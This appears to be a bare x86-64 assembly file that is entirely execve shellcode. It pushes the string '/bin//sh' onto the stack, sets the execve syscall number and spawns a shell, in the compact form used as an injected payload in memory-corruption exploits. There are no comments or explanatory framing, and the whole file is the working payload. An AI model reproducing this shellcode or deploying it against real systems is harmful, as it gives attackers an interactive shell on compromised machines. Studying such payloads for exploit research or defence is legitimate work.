.global	_start

.text
_start:
  xor    %rsi,%rsi
  push   %rsi
  movabs $0x68732f2f6e69622f,%rdi
  
  push   %rdi
  push   %rsp
  pop    %rdi
  pushq  $0x3b
  pop    %rax
  cltd   
  syscall 
